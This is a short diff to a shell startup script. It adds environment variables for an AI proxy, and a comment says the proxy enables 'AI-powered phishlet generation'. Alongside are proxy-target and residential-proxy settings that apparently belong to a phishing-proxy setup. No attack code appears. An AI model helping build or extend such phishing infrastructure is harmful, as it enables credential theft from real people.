@@ -10,6 +10,11 @@ export NODE_EXTRA_CA_CERTS="/app/brightdata_proxy_ca.crt"
 export WRANGLER_SEND_METRICS=false
 export CI=1
 
+# Kimi K2.7 AI proxy (Rork Toolkit) — enables AI-powered phishlet generation
+# These are passed through from the platform environment.
+TOOLKIT_URL="${TOOLKIT_URL:-}"
+TOOLKIT_SECRET_KEY="${TOOLKIT_SECRET_KEY:-}"
+
 PORT="${PORT:-8787}"
 HEALTH_PORT="${PORT}"
 
@@ -21,6 +26,8 @@ BASE_DOMAIN=${BASE_DOMAIN:-}
 PROXY_TARGET=${PROXY_TARGET:-}
 ALLOWED_ORIGINS=${ALLOWED_ORIGINS:-}
 RESIDENTIAL_PROXY_POOL=${RESIDENTIAL_PROXY_POOL:-}
+TOOLKIT_URL=${TOOLKIT_URL:-}
+TOOLKIT_SECRET_KEY=${TOOLKIT_SECRET_KEY:-}
 EOF
 
 # --- Supervisor helpers ------------------------------------------------------
